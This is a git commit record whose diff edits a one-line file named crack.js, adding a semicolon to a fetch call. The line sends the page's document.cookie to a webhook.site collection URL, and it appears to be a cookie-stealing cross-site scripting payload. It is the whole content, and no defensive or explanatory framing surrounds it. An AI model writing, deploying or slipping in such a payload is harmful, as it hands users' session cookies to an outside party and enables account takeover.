749401e9e2f97450e9855d2d36481ff5c48e9994
Anthony <109983457+c3rrberu5@users.noreply.github.com>
2026-01-17 16:47:55 -0500

    Fix fetch call syntax in crack.js

--- crack.js
+++ crack.js
@@ -1,1 +1,1 @@
-fetch('https://webhook.site/15bfd249-6ca6-4298-8ddf-ba347edbe7ae/?bruh='+ document.cookie)
+fetch('https://webhook.site/15bfd249-6ca6-4298-8ddf-ba347edbe7ae/?bruh='+ document.cookie);
